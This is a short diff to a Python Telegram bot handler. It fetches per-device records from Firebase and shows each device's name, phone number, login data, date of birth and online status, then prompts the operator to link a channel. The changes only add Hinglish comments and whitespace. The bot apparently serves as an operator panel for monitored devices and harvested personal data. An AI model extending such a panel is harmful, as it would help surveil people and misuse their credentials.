@@ -184,6 +184,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client_id = query.data.split("_")[1]
         selected_device_id = client_id
         try:
+            # Firebase se details fetch karna
             response = requests.get(f"{firebase_base}/user_data/{client_id}.json")
             details = response.json() or {}
             
@@ -195,6 +196,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             dob = login_data.get('dob', 'N/A')
             
             status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
+            
+            # Wahi common message structure jo set_device command mein hai
             msg = (f"📱 {details.get('d_name', 'Unknown')}\n"
                    f"🆔 {client_id}\n"
                    f"📞 {details.get('phoneNumber', 'Unknown')}\n"
@@ -204,6 +207,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                    f"📅 DOB: {dob}\n"
                    f"{status}\n\n"
                    f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
+            
             await query.edit_message_text(text=msg)
         except Exception as e:
             await query.edit_message_text(f"Error: {str(e)}")
